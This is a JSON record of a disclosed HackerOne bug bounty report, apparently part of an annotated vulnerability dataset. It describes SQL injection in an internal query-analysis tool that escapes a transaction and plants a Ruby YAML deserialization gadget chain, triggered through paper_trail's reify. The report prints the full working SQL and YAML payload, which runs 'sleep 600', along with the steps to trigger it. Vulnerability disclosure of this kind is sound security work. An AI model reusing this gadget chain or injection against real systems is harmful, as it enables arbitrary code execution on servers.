{
  "reported_to": "HackerOne",
  "reported_by": "jobert ",
  "title": "Ability to escape database transaction through SQL injection, leading to arbitrary code execution",
  "content": "\nHackerOne has an internal backend interface that gives debugging capabilities to its engineers. One of the features is the ability to run EXPLAIN ANALYZE queries against a connected database. This feature is accessible by a handful of engineers. The feature is vulnerable to a SQL injection that allows an attacker to escape the transaction that is wrapped around the EXPLAIN ANALYZE query. This SQL injection can be leveraged to execute arbitrary ruby on an application server.\nThis vulnerability will be demonstrated against a local development environment.\nProof of concept\ngo to http://localhost:8080/support/sql_query_analyzer\nanalyze the following query using the public database connection:\nCode 980 Bytes\n1SELECT\n2        1\n3;\n4\n5ROLLBACK\n6;\n7\n8INSERT\n9    INTO\n10        user_versions (\n11            item_type\n12            ,item_id\n13            ,event\n14            ,email\n15            ,object\n16        )\n17    VALUES (\n18        'User'\n19        ,2\n20        ,'update'\n21        , 'uniquekeywordtotriggercode@hackerone.com'\n22        ,'---\n23username:\n24  - !ruby/object:Gem::Installer\n25      i: x\n26  - !ruby/object:Gem::SpecFetcher\n27      i: y\n28  - !ruby/object:Gem::Requirement\n29    requirements:\n30      !ruby/object:Gem::Package::TarReader\n31      io: &1 !ruby/object:Net::BufferedIO\n32        io: &1 !ruby/object:Gem::Package::TarReader::Entry\n33            read: 0\n34            header: \"abc\"\n35        debug_output: &1 !ruby/object:Net::WriteAdapter\n36            socket: &1 !ruby/object:Gem::RequestSet\n37                sets: !ruby/object:Net::WriteAdapter\n38                    socket: !ruby/module ''Kernel''\n39                    method_id: :system\n40                git_set: sleep 600\n41            method_id: :resolve '\n42    )\n43;\n44\n45-- \nvisit http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com and observe that the page will hang for 600 seconds and then result in a 500 internal server error, proving that it executes the sleep 600 command in the injected object.\nRoot cause\nThe following Ruby code is used to execute the EXPLAIN ANALYZE query:\nCode 497 Bytes\n1# ...\n2explain_analyze = \"EXPLAIN (ANALYZE, COSTS, VERBOSE, BUFFERS, FORMAT JSON) #{raw_sql}\"\n3\n4begin\n5  conn.transaction(requires_new: true) do\n6    block = proc do\n7      analyze_result = conn.protected_attribute.with_parameters(params) do\n8        conn.execute explain_analyze\n9      end\n10\n11      fail ActiveRecord::Rollback\n12    end\n13\n14    if config[:use_protected_schema]\n15      ProtectedAttribute::SchemaUtility.with_requester(user) do\n16        block.call\n17      end\n18    else\n19      block.call\n20    end\n21# ...\nThe code is written so that it would wrap each analyze query in a transaction. This avoids permanent side effects of running the query, because EXPLAIN ANALYZE will still execute the SQL query. The interpolation of the raw_sql variable can be used to escape the current transactions and make any changes persist. The following part is used to jump out of the transaction:\nCode 30 Bytes\n1SELECT\n2        1\n3;\n4\n5ROLLBACK\n6;\nThen, a payload is injected into a table called user_versions and a comment identifier (-- ) is used to block the ROLLBACK statement that is appended by the transaction block. The user_versions table keeps a paper trail of changes on User objects. For example, when someone changes their username, the application keeps a snapshot of the previous object in the user_versions table. HackerOne uses a gem called paper_trail for this. This gem comes with a useful function to reinstantiate an old version of an object, called reify. When this method is called, the YAML from the object attribute is deseriealized and is used to initialize the class stored in the item_type column. This method inherently trusts the object stored in object however. Because the attacker can persist a new version, it can control the object that would be deserialized. In the past, multiple YAML deserialization techniques have been published. For the proof of concept, I reused Stratum Security's payload from 2021.\nThere is only one place where the reify method is called on a UserVersion object, and it's through the historic users feature. It's using the following code:\nCode 348 Bytes\n1def index\n2  if params[:historic_user_input].present?\n3    if params[:historic_user_input].include? '@'\n4      versions = UserVersion.where(email: params[:historic_user_input]).order(id: :asc).to_a\n5      current_owner = User.find_by(email: params[:historic_user_input])\n6    else\n7      # ...\n8    end\n9\n10    # ...\n11\n12    original_user = versions.first.reify\nThis code will pull all UserVersion objects based on the email attribute and sorts them based on the primary key ascending. Because we also can control the email attribute through the SQL injection, we need to simply persist a version with a value that is unique in the table, such as uniquekeywordtotriggercode@hackerone.com. When the page is loaded with that as the value for the historic_user_input, it will only return our injected object and reinstantiate it, leading to the execution of arbitrary ruby code or, in this case, a command.\nImpact\nExecution of arbitrary ruby code.\n\n",
  "severity": [
    8.0,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1660085880,
  "report_url": "https://hackerone.com/reports/1663299",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Navigate to http://localhost:8080/support/sql_query_analyzer and input the malicious SQL query containing ROLLBACK and YAML payload."
    ],
    [
      2,
      "Visit http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com to trigger the deserialization and execute arbitrary Ruby code."
    ]
  ],
  "vuln_description": "The vulnerability allows escaping a database transaction via SQL injection in an EXPLAIN ANALYZE query feature, leading to arbitrary Ruby code execution through YAML deserialization in the paper_trail gem's reify method.",
  "reason": "This vulnerability involves multiple complex components: SQL injection to escape a transaction, crafting a YAML payload for Ruby deserialization, understanding the paper_trail gem's behavior, and triggering the deserialization through a specific application feature. The interaction between these components is non-obvious and requires deep understanding of both database transactions and Ruby object serialization.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves SQL injection and YAML deserialization within the same application context, which could be detected by analyzing HTTP requests and responses for unusual SQL queries or YAML payloads. The methodology focuses on authN/authZ bypasses within the same application, which aligns with the attack vector described.",
    "is_detectable": true
  }
}